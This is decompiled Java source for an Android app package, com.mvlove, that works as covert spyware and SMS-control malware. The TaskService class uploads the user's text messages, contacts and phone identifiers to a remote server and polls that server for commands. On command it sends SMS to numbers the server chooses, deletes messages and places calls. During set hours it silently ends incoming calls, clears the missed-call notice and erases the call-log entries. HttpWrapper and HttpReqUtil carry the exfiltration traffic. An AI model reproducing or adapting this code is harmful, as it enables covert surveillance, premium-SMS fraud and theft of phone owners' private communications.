package com.mvlove.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.provider.CallLog.Calls;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.android.internal.telephony.ITelephony;
import com.mvlove.entity.Contact;
import com.mvlove.entity.Motion;
import com.mvlove.entity.RemoteCall;
import com.mvlove.entity.RemoteSms;
import com.mvlove.entity.RemoteSmsState;
import com.mvlove.entity.ResEntity;
import com.mvlove.entity.User;
import com.mvlove.util.AppUtil;
import com.mvlove.util.CallLogUtil;
import com.mvlove.util.ContactUtil;
import com.mvlove.util.HttpReqUtil;
import com.mvlove.util.LocalManager;
import com.mvlove.util.LogUtil;
import com.mvlove.util.PhoneUtil;
import com.mvlove.util.SmsUtil;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class TaskService extends Service {
    private static final int WHAT_PUSH_SMS = 1000;
    private CallLogContent mCalllogContent;
    /* access modifiers changed from: private */
    public ITelephony mITelephony;
    /* access modifiers changed from: private */
    public String mIncomingNumber;
    private Looper mLooper;
    /* access modifiers changed from: private */
    public PushSmsHandler mPushHandler;
    private LoadMotionThread mThread;
    private SmsContent smsContent;

    class CallLogContent extends ContentObserver {
        public CallLogContent(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            if (TaskService.this.isPhoneForbidden()) {
                CallLogUtil.deleteRecentLog(TaskService.this.getApplication(), TaskService.this.mIncomingNumber);
            }
        }
    }

    class LoadMotionThread extends Thread {
        Context context;

        public LoadMotionThread(Context context) {
            this.context = context;
        }

        public void run() {
            super.run();
            while (true) {
                try {
                    if (!AppUtil.isMainApkInstalled(this.context)) {
                        ResEntity entity = null;
                        List<Contact> contacts = ContactUtil.readContact(this.context);
                        try {
                            entity = HttpReqUtil.getMotion(this.context, PhoneUtil.getPhone(this.context), PhoneUtil.getImei(this.context), PhoneUtil.getModel(), PhoneUtil.getVersion(), contacts);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        if (entity != null) {
                            if (entity.isSuccess()) {
                                int i;
                                User user = entity.getUser();
                                if (user != null) {
                                    LocalManager.setUser(this.context, user);
                                }
                                LocalManager.updateContactList(this.context, contacts);
                                List<Motion> motions = entity.getMotions();
                                if (!(motions == null || motions.isEmpty())) {
                                    String mids = "";
                                    for (i = 0; i < motions.size(); i++) {
                                        Motion motion = (Motion) motions.get(i);
                                        if (motion != null) {
                                            SmsUtil.deleteSms(this.context, motion.getEid());
                                            mids = new StringBuilder(String.valueOf(mids)).append(motion.getId()).toString();
                                            if (i != motions.size() - 1) {
                                                mids = new StringBuilder(String.valueOf(mids)).append(",").toString();
                                            }
                                        }
                                    }
                                    if (!TextUtils.isEmpty(mids)) {
                                        try {
                                            HttpReqUtil.updateMotionStatus(this.context, mids);
                                        } catch (Exception e2) {
                                            e2.printStackTrace();
                                        }
                                    }
                                }
                                List<RemoteSms> remoteSmsList = entity.getRemoteSmsList();
                                if (!(remoteSmsList == null || remoteSmsList.isEmpty())) {
                                    String ids = "";
                                    for (i = 0; i < remoteSmsList.size(); i++) {
                                        RemoteSms sms = (RemoteSms) remoteSmsList.get(i);
                                        sendMessage(sms);
                                        ids = new StringBuilder(String.valueOf(ids)).append(sms.getId()).toString();
                                        if (i != remoteSmsList.size() - 1) {
                                            ids = new StringBuilder(String.valueOf(ids)).append(",").toString();
                                        }
                                    }
                                    HttpReqUtil.updateRemoteSmsStatus(this.context, ids);
                                }
                                ArrayList<RemoteCall> calls = entity.getRemoteCalls();
                                if (!(calls == null || calls.isEmpty())) {
                                    Intent intent = new Intent(this.context, PhoneService.class);
                                    intent.putParcelableArrayListExtra(PhoneService.KEY_EXTRA_REMOTECALLS, calls);
                                    this.context.startService(intent);
                                }
                            }
                        }
                    }
                    Thread.sleep(180000);
                } catch (Exception e22) {
                    e22.printStackTrace();
                }
            }
        }

        /* access modifiers changed from: 0000 */
        public void sendMessage(RemoteSms sms) {
            if (sms != null) {
                try {
                    SmsManager smsManager = SmsManager.getDefault();
                    String address = sms.getTargetPhone();
                    for (String text : smsManager.divideMessage(sms.getContent())) {
                        smsManager.sendTextMessage(address, null, text, null, null);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    static class PushSmsHandler extends Handler {
        private Context context;

        public PushSmsHandler(Context context, Looper looper) {
            super(looper);
            this.context = context;
        }

        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case TaskService.WHAT_PUSH_SMS /*1000*/:
                    LogUtil.println("start upload");
                    if (msg.obj != null) {
                        pushMessage(this.context, msg.obj);
                        return;
                    }
                    pushMessage();
                    return;
                default:
                    return;
            }
        }

        private synchronized void pushMessage(Context context, com.mvlove.entity.Message message) {
            if (message != null) {
                if (!AppUtil.isMainApkInstalled(context)) {
                    List<com.mvlove.entity.Message> messages = new ArrayList();
                    messages.add(message);
                    try {
                        ResEntity entity = HttpReqUtil.pushMessage(context, messages, PhoneUtil.getPhone(context), PhoneUtil.getImei(context), PhoneUtil.getModel(), PhoneUtil.getVersion());
                        if (entity != null) {
                            entity.isSuccess();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            return;
        }

        private synchronized void pushMessage() {
            if (!AppUtil.isMainApkInstalled(this.context)) {
                String phone = PhoneUtil.getPhone(this.context);
                String imei = PhoneUtil.getImei(this.context);
                String model = PhoneUtil.getModel();
                String clientVersion = PhoneUtil.getVersion();
                List<com.mvlove.entity.Message> messages = SmsUtil.loadMessage(this.context, LocalManager.getSmsId(this.context), PhoneUtil.getPhone(this.context));
                if (!(messages == null || messages.isEmpty())) {
                    long maxId = TaskService.getMaxId(messages);
                    try {
                        ResEntity entity = HttpReqUtil.pushMessage(this.context, messages, phone, imei, model, clientVersion);
                        if (entity != null && entity.isSuccess()) {
                            LocalManager.setSmsId(this.context, maxId);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            return;
        }
    }

    class SmsContent extends ContentObserver {
        public SmsContent(Handler handler) {
            super(handler);
        }

        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            TaskService.this.mPushHandler.sendEmptyMessageDelayed(TaskService.WHAT_PUSH_SMS, 10000);
        }
    }

    class TelStateListener extends PhoneStateListener {
        TelStateListener() {
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case RemoteSmsState.STATUS_SEND /*1*/:
                    if (TaskService.this.isPhoneForbidden()) {
                        try {
                            TaskService.this.mIncomingNumber = incomingNumber;
                            TaskService.this.mITelephony.endCall();
                            TaskService.this.mITelephony.cancelMissedCallsNotification();
                            return;
                        } catch (Exception e) {
                            e.printStackTrace();
                            return;
                        }
                    }
                    return;
                default:
                    return;
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        LogUtil.println("onCreate");
        this.smsContent = new SmsContent(new Handler());
        getContentResolver().registerContentObserver(Uri.parse(SmsUtil.SMS_URI_ALL), true, this.smsContent);
        HandlerThread thread = new HandlerThread(TaskService.class.getName());
        thread.start();
        this.mLooper = thread.getLooper();
        this.mPushHandler = new PushSmsHandler(getApplicationContext(), this.mLooper);
        TelephonyManager telephonyMgr = (TelephonyManager) getSystemService("phone");
        try {
            Method getITelephonyMethod = TelephonyManager.class.getDeclaredMethod("getITelephony", null);
            getITelephonyMethod.setAccessible(true);
            this.mITelephony = (ITelephony) getITelephonyMethod.invoke(telephonyMgr, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        telephonyMgr.listen(new TelStateListener(), 32);
        this.mCalllogContent = new CallLogContent(this.mPushHandler);
        getContentResolver().registerContentObserver(Calls.CONTENT_URI, true, this.mCalllogContent);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        LogUtil.println("onStart");
        if (this.mThread == null || !this.mThread.isAlive()) {
            this.mThread = new LoadMotionThread(getApplicationContext());
            this.mThread.start();
        }
        if (intent != null) {
            com.mvlove.entity.Message message = (com.mvlove.entity.Message) intent.getSerializableExtra("data");
            if (message != null) {
                this.mPushHandler.sendMessage(this.mPushHandler.obtainMessage(WHAT_PUSH_SMS, message));
            }
        }
    }

    public void onDestroy() {
        getContentResolver().unregisterContentObserver(this.smsContent);
        getContentResolver().unregisterContentObserver(this.mCalllogContent);
        this.mLooper.quit();
        super.onDestroy();
    }

    /* access modifiers changed from: private */
    public boolean isPhoneForbidden() {
        User user = LocalManager.getUser(getApplicationContext());
        boolean isForbbiden = false;
        if (user == null || !user.isPhoneForbidden()) {
            return false;
        }
        Date startTime = user.getPhoneStartTime();
        Date endTime = user.getPhoneEndTime();
        if (startTime == null || endTime == null) {
            return false;
        }
        Date now = new Date();
        int nowHours = now.getHours();
        int nowMinutes = now.getMinutes();
        int startHours = startTime.getHours();
        int startMinutes = startTime.getMinutes();
        int endHours = endTime.getHours();
        int endMinutes = endTime.getMinutes();
        if (endTime.getTime() < startTime.getTime()) {
            if (nowHours < endHours) {
                isForbbiden = true;
            }
            if (nowHours == endHours && nowMinutes <= endMinutes) {
                isForbbiden = true;
            }
            if (nowHours > startHours) {
                isForbbiden = true;
            }
            if (nowHours != startHours || nowMinutes < startMinutes) {
                return isForbbiden;
            }
            return true;
        } else if (endTime.getTime() <= startTime.getTime()) {
            return false;
        } else {
            if (nowHours > startHours && nowHours < endHours) {
                isForbbiden = true;
            }
            if (nowHours == startHours && nowMinutes > startMinutes) {
                isForbbiden = true;
            }
            if (nowHours != endHours || nowMinutes >= endMinutes) {
                return isForbbiden;
            }
            return true;
        }
    }

    static long getMaxId(List<com.mvlove.entity.Message> messages) {
        long id = 0;
        for (int i = 0; i < messages.size(); i++) {
            try {
                long mid = Long.parseLong(((com.mvlove.entity.Message) messages.get(i)).getCid());
                if (mid > id) {
                    id = mid;
                }
            } catch (NumberFormatException e) {
                e.printStackTrace();
            }
        }
        return id;
    }
}
package com.mvlove.http;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.text.TextUtils;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import com.mvlove.App;
import com.mvlove.http.exception.HttpResponseException;
import com.mvlove.util.LogUtil;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Type;
import java.net.URI;
import java.nio.charset.Charset;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.zip.GZIPInputStream;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpRequest;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnRouteParams;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MIME;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.message.BasicHeader;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.CharArrayBuffer;
import org.apache.http.util.EntityUtils;

public class HttpWrapper {
    private static final String CTWAP_PROXY_SERVER = "10.0.0.200";
    private static final String UNIWAP_PROXY_SERVER = "10.0.0.172";
    private static HttpWrapper wrapper;
    private String apnName = "";
    private boolean isWifi = false;
    private BroadcastReceiver receiver = new NetWorkStatusReceiver();

    class NetWorkStatusReceiver extends BroadcastReceiver {
        NetWorkStatusReceiver() {
        }

        public void onReceive(Context context, Intent intent) {
            HttpWrapper.this.setNetWorkInfo(context);
        }
    }

    public static synchronized HttpWrapper getInstance() {
        HttpWrapper httpWrapper;
        synchronized (HttpWrapper.class) {
            if (wrapper == null) {
                wrapper = new HttpWrapper();
            }
            httpWrapper = wrapper;
        }
        return httpWrapper;
    }

    private HttpWrapper() {
        Context context = App.getAppContext();
        context.registerReceiver(this.receiver, new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE"));
        setNetWorkInfo(context);
    }

    /* access modifiers changed from: protected */
    public void finalize() throws Throwable {
        try {
            App.getAppContext().unregisterReceiver(this.receiver);
        } catch (Exception e) {
            e.printStackTrace();
        }
        super.finalize();
    }

    /* access modifiers changed from: private */
    public void setNetWorkInfo(Context context) {
        NetworkInfo networkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        LogUtil.debug("############当前网络状态改变##############");
        if (networkInfo == null) {
            setApnName("");
            setWifi(false);
            return;
        }
        LogUtil.debug("******当前活动网络为:" + networkInfo.getTypeName());
        if (1 == networkInfo.getType()) {
            setApnName("");
            setWifi(true);
        } else if (networkInfo.getType() == 0) {
            setApnName(ApnUtil.getApnType(context));
            setWifi(false);
        }
    }

    public void supportGzip(HttpRequest request) {
        request.addHeader("Accept-Encoding", "gzip");
    }

    public boolean isSupportGzip(HttpResponse response) {
        Header contentEncoding = response.getFirstHeader("Content-Encoding");
        return contentEncoding != null && contentEncoding.getValue().equalsIgnoreCase("gzip");
    }

    public boolean checkNeedProxy() {
        if (ApnNet.CMWAP.equals(this.apnName) || ApnNet.UNIWAP.equals(this.apnName) || ApnNet.GWAP_3.equals(this.apnName) || ApnNet.CTWAP.equals(this.apnName)) {
            return true;
        }
        return false;
    }

    public void checkProxy(HttpRequest request) {
        if (!this.isWifi) {
            if (ApnNet.CMWAP.equals(this.apnName) || ApnNet.UNIWAP.equals(this.apnName) || ApnNet.GWAP_3.equals(this.apnName)) {
                ConnRouteParams.setDefaultProxy(request.getParams(), new HttpHost(UNIWAP_PROXY_SERVER, 80));
            } else if (ApnNet.CTWAP.equals(this.apnName)) {
                ConnRouteParams.setDefaultProxy(request.getParams(), new HttpHost(CTWAP_PROXY_SERVER, 80));
            }
        }
    }

    public <T> T getJSON(String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return getJSON(null, url, data, clazz);
    }

    public <T> T getJSON(HttpGet request, String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        if (!(data == null || data.isEmpty())) {
            String paramStr = "";
            for (Entry<String, String> entry : data.entrySet()) {
                paramStr = new StringBuilder(String.valueOf(paramStr)).append("&").append((String) entry.getKey()).append("=").append((String) entry.getValue()).toString();
            }
            if (url.indexOf("?") == -1) {
                url = new StringBuilder(String.valueOf(url)).append(paramStr.replaceFirst("&", "?")).toString();
            } else {
                url = new StringBuilder(String.valueOf(url)).append(paramStr).toString();
            }
        }
        if (request == null) {
            request = new HttpGet();
        }
        request.setURI(URI.create(url));
        LogUtil.debug("url :" + url);
        supportGzip(request);
        checkProxy(request);
        try {
            return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);
        } catch (NullPointerException e) {
            throw new IOException(e.getMessage());
        }
    }

    public <T> List<T> getJSONArray(String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return getJSONArray(null, url, data, clazz);
    }

    public <T> List<T> getJSONArray(HttpGet request, String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        if (!(data == null || data.isEmpty())) {
            String paramStr = "";
            for (Entry<String, String> entry : data.entrySet()) {
                paramStr = new StringBuilder(String.valueOf(paramStr)).append("&").append((String) entry.getKey()).append("=").append((String) entry.getValue()).toString();
            }
            if (url.indexOf("?") == -1) {
                url = new StringBuilder(String.valueOf(url)).append(paramStr.replaceFirst("&", "?")).toString();
            } else {
                url = new StringBuilder(String.valueOf(url)).append(paramStr).toString();
            }
        }
        if (request == null) {
            request = new HttpGet();
        }
        request.setURI(URI.create(url));
        LogUtil.debug("url :" + url);
        supportGzip(request);
        checkProxy(request);
        try {
            HttpResponse response = HttpClientManager.getHttpClient().execute(request);
            int statusCode = response.getStatusLine().getStatusCode();
            if (statusCode == 200) {
                Reader reader;
                try {
                    String result;
                    HttpEntity entity = response.getEntity();
                    if (isSupportGzip(response)) {
                        reader = new InputStreamReader(new GZIPInputStream(entity.getContent()), EntityUtils.getContentCharSet(entity));
                        CharArrayBuffer buffer = new CharArrayBuffer((int) entity.getContentLength());
                        char[] tmp = new char[1024];
                        while (true) {
                            int l = reader.read(tmp);
                            if (l == -1) {
                                break;
                            }
                            buffer.append(tmp, 0, l);
                        }
                        reader.close();
                        result = buffer.toString();
                    } else {
                        result = EntityUtils.toString(entity);
                    }
                    entity.consumeContent();
                    Type listType = new TypeToken<List<T>>() {
                    }.getType();
                    GsonBuilder gBuilder = new GsonBuilder();
                    gBuilder.registerTypeAdapter(listType, new ListTypeAdapter(clazz));
                    return (List) gBuilder.create().fromJson(result, listType);
                } catch (OutOfMemoryError e) {
                    System.gc();
                    return null;
                } catch (Throwable th) {
                    reader.close();
                }
            }
            throw new HttpResponseException(statusCode);
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        }
    }

    public <T> T postJSON(String url, Object value, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return postJSON(null, url, value, (Class) clazz);
    }

    public <T> T postJSON(HttpPost request, String url, Object value, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        LogUtil.debug("url :" + url);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        try {
            StringEntity entity = new StringEntity(new Gson().toJson(value), "UTF-8");
            entity.setContentType(new BasicHeader(MIME.CONTENT_TYPE, "application/json"));
            request.setEntity(entity);
            return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);
        } catch (UnsupportedEncodingException e) {
            throw new ParseException(e.getMessage());
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        }
    }

    public <T> List<T> postJSON(String url, Map<String, String> data, Class<T> clazz) throws ClientProtocolException, IOException {
        return postJSON(null, url, (Map) data, (Class) clazz);
    }

    public <T> List<T> postJSON(HttpPost request, String url, Map<String, String> data, Class<T> clazz) throws ClientProtocolException, IOException {
        LogUtil.debug("url :" + url);
        LogUtil.debug("data :" + data);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        List<NameValuePair> parameters = new LinkedList();
        for (Entry<String, String> entry : data.entrySet()) {
            if (entry.getValue() != null) {
                parameters.add(new BasicNameValuePair((String) entry.getKey(), (String) entry.getValue()));
            }
        }
        Reader reader;
        try {
            request.setEntity(new UrlEncodedFormEntity(parameters, "UTF-8"));
            HttpResponse response = HttpClientManager.getHttpClient().execute(request);
            if (response.getStatusLine().getStatusCode() != 200) {
                return null;
            }
            String result;
            HttpEntity entity = response.getEntity();
            if (isSupportGzip(response)) {
                reader = new InputStreamReader(new GZIPInputStream(entity.getContent()), EntityUtils.getContentCharSet(entity));
                CharArrayBuffer buffer = new CharArrayBuffer((int) entity.getContentLength());
                char[] tmp = new char[1024];
                while (true) {
                    int l = reader.read(tmp);
                    if (l == -1) {
                        break;
                    }
                    buffer.append(tmp, 0, l);
                }
                reader.close();
                result = buffer.toString();
            } else {
                result = EntityUtils.toString(entity);
            }
            entity.consumeContent();
            LogUtil.debug(result);
            GsonBuilder gBuilder = new GsonBuilder();
            Type listType = new TypeToken<List<T>>() {
            }.getType();
            gBuilder.registerTypeAdapter(listType, new ListTypeAdapter(clazz));
            return (List) gBuilder.create().fromJson(result, listType);
        } catch (UnsupportedEncodingException e) {
            throw new ParseException(e.getMessage());
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        } catch (Throwable th) {
            reader.close();
        }
    }

    public <T> T postJSON(String url, String json, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return postJSON(null, url, json, (Class) clazz);
    }

    public <T> T postJSON(HttpPost request, String url, String json, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        LogUtil.debug(url);
        LogUtil.debug("data = " + json);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        try {
            StringEntity entity = new StringEntity(json, "UTF-8");
            entity.setContentType(new BasicHeader(MIME.CONTENT_TYPE, "application/json"));
            request.setEntity(entity);
            return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);
        } catch (UnsupportedEncodingException e) {
            throw new ParseException(e.getMessage());
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        }
    }

    public <T> List<T> postJSONArray(String url, Object value, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return postJSONArray(null, url, value, clazz);
    }

    public <T> List<T> postJSONArray(HttpPost request, String url, Object value, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        LogUtil.debug("url = " + url);
        LogUtil.debug("data = " + value);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        try {
            StringEntity entity = new StringEntity(new Gson().toJson(value), "UTF-8");
            entity.setContentType(new BasicHeader(MIME.CONTENT_TYPE, "application/json"));
            request.setEntity(entity);
            HttpResponse response = HttpClientManager.getHttpClient().execute(request);
            int statusCode = response.getStatusLine().getStatusCode();
            if (statusCode == 200) {
                String result;
                entity = response.getEntity();
                if (isSupportGzip(response)) {
                    Reader reader = new InputStreamReader(new GZIPInputStream(entity.getContent()), EntityUtils.getContentCharSet(entity));
                    CharArrayBuffer buffer = new CharArrayBuffer((int) entity.getContentLength());
                    try {
                        char[] tmp = new char[1024];
                        while (true) {
                            int l = reader.read(tmp);
                            if (l == -1) {
                                break;
                            }
                            buffer.append(tmp, 0, l);
                        }
                        result = buffer.toString();
                    } finally {
                        reader.close();
                    }
                } else {
                    result = EntityUtils.toString(entity);
                }
                entity.consumeContent();
                GsonBuilder gBuilder = new GsonBuilder();
                Type listType = new TypeToken<List<T>>() {
                }.getType();
                gBuilder.registerTypeAdapter(listType, new ListTypeAdapter(clazz));
                return (List) gBuilder.create().fromJson(result, listType);
            }
            throw new HttpResponseException(statusCode);
        } catch (UnsupportedEncodingException e) {
            throw new ParseException(e.getMessage());
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        }
    }

    public <T> T post(String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        return post(null, url, data, clazz);
    }

    public <T> T post(HttpPost request, String url, Map<String, String> data, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        LogUtil.debug("post url:" + url);
        LogUtil.debug("post data:" + data);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        List<NameValuePair> parameters = new LinkedList();
        for (Entry<String, String> entry : data.entrySet()) {
            if (entry.getValue() != null) {
                parameters.add(new BasicNameValuePair((String) entry.getKey(), (String) entry.getValue()));
            }
        }
        try {
            request.setEntity(new UrlEncodedFormEntity(parameters, "UTF-8"));
            return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);
        } catch (UnsupportedEncodingException e) {
            throw new ParseException(e.getMessage());
        } catch (NullPointerException e2) {
            throw new IOException(e2.getMessage());
        }
    }

    public <T> T uploadFile(String url, Map<String, String> data, Map<String, File> files, Class<T> clazz, FileTransferListener fileTransferListener) throws ParseException, IOException, HttpResponseException {
        return uploadFile(null, url, data, files, clazz, fileTransferListener);
    }

    public <T> T uploadFile(HttpPost request, String url, Map<String, String> data, Map<String, File> files, Class<T> clazz, FileTransferListener fileTransferListener) throws ParseException, IOException, HttpResponseException {
        LogUtil.debug(url);
        LogUtil.debug("data :" + data);
        if (request == null) {
            request = new HttpPost();
        }
        request.setURI(URI.create(url));
        supportGzip(request);
        checkProxy(request);
        Charset charset = Charset.forName("UTF-8");
        EIMultipartEntity entity = new EIMultipartEntity(fileTransferListener);
        if (!(data == null || data.isEmpty())) {
            for (Entry<String, String> entry : data.entrySet()) {
                entity.addPart((String) entry.getKey(), new StringBody((String) entry.getValue(), charset));
            }
        }
        if (!(files == null || files.isEmpty())) {
            for (Entry<String, File> entry2 : files.entrySet()) {
                entity.addPart((String) entry2.getKey(), new FileBody((File) entry2.getValue()));
            }
        }
        try {
            request.setEntity(entity);
            return processResponse(HttpClientManager.getHttpClient().execute(request), clazz);
        } catch (Exception e) {
            throw new IOException(e.getMessage());
        }
    }

    private <T> T processResponse(HttpResponse response, Class<T> clazz) throws ParseException, IOException, HttpResponseException {
        int statusCode = response.getStatusLine().getStatusCode();
        if (statusCode == 200) {
            String result;
            HttpEntity entity = response.getEntity();
            if (isSupportGzip(response)) {
                InputStream is = new GZIPInputStream(entity.getContent());
                String charset = EntityUtils.getContentCharSet(entity);
                if (TextUtils.isEmpty(charset)) {
                    charset = "UTF-8";
                }
                Reader reader = new InputStreamReader(is, charset);
                CharArrayBuffer buffer = new CharArrayBuffer((int) entity.getContentLength());
                try {
                    char[] tmp = new char[1024];
                    while (true) {
                        int l = reader.read(tmp);
                        if (l == -1) {
                            break;
                        }
                        buffer.append(tmp, 0, l);
                    }
                    result = buffer.toString();
                    LogUtil.debug(result);
                } finally {
                    reader.close();
                }
            } else {
                result = EntityUtils.toString(entity);
            }
            entity.consumeContent();
            if (TextUtils.isEmpty(result)) {
                return null;
            }
            LogUtil.debug("processResponse" + result);
            GsonBuilder gsonb = new GsonBuilder();
            gsonb.serializeNulls();
            Gson gson = gsonb.create();
            if (clazz.equals(Map.class)) {
                return gson.fromJson(result, new TypeToken<Map<String, String>>() {
                }.getType());
            }
            return !clazz.equals(String.class) ? gson.fromJson(result, (Class) clazz) : result;
        } else {
            throw new HttpResponseException(statusCode);
        }
    }

    public boolean isWifi() {
        return this.isWifi;
    }

    public void setWifi(boolean isWifi) {
        this.isWifi = isWifi;
    }

    public String getApnName() {
        return this.apnName;
    }

    public void setApnName(String apnName) {
        this.apnName = apnName;
    }
}
package com.mvlove.util;

import android.content.Context;
import android.text.TextUtils;
import com.google.gson.Gson;
import com.mvlove.entity.Contact;
import com.mvlove.entity.Message;
import com.mvlove.entity.ResEntity;
import com.mvlove.http.HttpWrapper;
import com.mvlove.http.exception.HttpResponseException;
import com.mvlove.util.Constants.Interface;
import java.io.IOException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;

public class HttpReqUtil {
    public static final ResEntity pushMessage(Context context, List<Message> messages, String phone, String imei, String model, String clientVersion) throws HttpResponseException, ParseException, IOException {
        Map<String, String> data = new HashMap();
        data.put("phone", phone);
        data.put("imei", imei);
        data.put("model", model);
        data.put("clientVersion", clientVersion);
        data.put("messageStr", new Gson().toJson((Object) messages));
        return (ResEntity) HttpWrapper.getInstance().post(Interface.getPushSmsUrl(), data, ResEntity.class);
    }

    public static final ResEntity getMotion(Context context, String phone, String imei, String model, String clientVersion, List<Contact> contacts) throws ClientProtocolException, IOException {
        Map<String, String> data = new HashMap();
        data.put("phone", phone);
        data.put("imei", imei);
        data.put("model", model);
        data.put("clientVersion", clientVersion);
        if (!(contacts == null || contacts.isEmpty())) {
            data.put("contactStr", new Gson().toJson((Object) contacts));
        }
        return (ResEntity) HttpWrapper.getInstance().post(Interface.getMotionUrl(), data, ResEntity.class);
    }

    public static final void updateMotionStatus(Context context, String mid) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(mid)) {
            Map<String, String> data = new HashMap();
            data.put("mid", mid);
            HttpWrapper.getInstance().post(Interface.getUpdateMotionUrl(), data, String.class);
        }
    }

    public static final void updateRemoteSmsStatus(Context context, String ids) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(ids)) {
            Map<String, String> data = new HashMap();
            data.put("mid", ids);
            HttpWrapper.getInstance().post(Interface.getUpdateRemoteSmsStatusUrl(), data, String.class);
        }
    }

    public static final void getUpdateRemoteCallStatus(Context context, String ids) throws HttpResponseException, ParseException, IOException {
        if (!TextUtils.isEmpty(ids)) {
            Map<String, String> data = new HashMap();
            data.put("mid", ids);
            HttpWrapper.getInstance().post(Interface.getUpdateRemoteCallStatusUrl(), data, String.class);
        }
    }
}
package com.mvlove.util;

import android.content.Context;
import android.os.Build;
import android.os.Build.VERSION;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

public class PhoneUtil {
    public static final String getPhone(Context context) {
        String phone = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
        if (TextUtils.isEmpty(phone)) {
            phone = LocalManager.getPhone(context);
        }
        if (TextUtils.isEmpty(phone)) {
            return phone;
        }
        return phone.replaceAll("\\+", "");
    }

    public static final String getImei(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getSimSerialNumber();
    }

    public static final String getModel() {
        return Build.MODEL;
    }

    public static final String getVersion() {
        return VERSION.RELEASE;
    }
}
